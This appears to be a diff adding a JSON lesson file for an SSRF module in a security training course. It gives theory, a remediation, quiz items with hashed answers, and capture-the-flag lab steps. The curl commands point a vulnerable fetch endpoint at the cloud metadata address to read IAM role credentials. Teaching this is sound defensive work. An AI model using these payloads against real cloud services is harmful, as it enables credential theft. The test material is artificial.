@@ -1,0 +1,54 @@
+{
+  "order": 6,
+  "id": "ssrf",
+  "title": "SSRF",
+  "track": "OWASP Top 10",
+  "difficulty": "core",
+  "estimate": "20 min",
+  "brief": "**Ticket:** a 'fetch URL' feature does not check where it points. Reach the cloud metadata service and capture the role credential it exposes.",
+  "theory": "## SSRF (OWASP A10)\nThe server fetches a URL you choose. With no validation you reach internal services and the cloud metadata IP `169.254.169.254` (a **link-local** address) to steal credentials.\n\n**Fix:** allowlist http/https, resolve the host, reject private/loopback/link-local ranges.",
+  "worked_example": "```\n$ curl \"https://x/fetch?url=http://169.254.169.254/latest/meta-data/iam/...\"\n{\"AccessKeyId\":\"ASIA...\"}   # instance creds leaked\n```",
+  "knowledge_check": [
+    {
+      "q": "The cloud metadata IP is:",
+      "type": "choice",
+      "choices": [
+        "10.0.0.1",
+        "169.254.169.254",
+        "127.0.0.1",
+        "8.8.8.8"
+      ],
+      "answer_sha256": "34146ce1ba492ed7acf9a9925a04541645c203d9652183c6e238f55786c8b66f"
+    },
+    {
+      "q": "169.254.0.0/16 is which range?",
+      "type": "choice",
+      "choices": [
+        "public",
+        "link-local",
+        "loopback",
+        "multicast"
+      ],
+      "answer_sha256": "6064640044b6aa881fb94ec61b949b948b58b8089a71d488ce1d766ea42b58a0"
+    }
+  ],
+  "investigation": {
+    "intro": "Make the server fetch the internal metadata path.",
+    "steps": [
+      "```bash\ncd /workspaces/examto/ctf-lab\npython3 -m venv .venv 2>/dev/null; . .venv/bin/activate 2>/dev/null; pip install -q -r requirements.txt\npython3 target/run_target.py        # leave this running\n```",
+      "In a second terminal, point the fetch at the metadata service:\n```bash\ncurl -s \"http://127.0.0.1:5000/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/role\"\n```",
+      "The response body is the flag."
+    ],
+    "hints": [
+      "The classic internal target is the link-local metadata IP.",
+      "169.254.169.254 serves instance metadata.",
+      "Fetch the /latest/meta-data/iam/security-credentials/role path."
+    ]
+  },
+  "capture": {
+    "task": "**Capture the flag.** Use SSRF to read the metadata role path and submit the `FLAG{...}`.",
+    "hint": "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/role",
+    "placeholder": "FLAG{...}",
+    "answer_sha256": "6e71255c1dc61969a0ae5197e72ac75eb37a0a7ae0808c08db3e4c5874a520a5"
+  }
+}
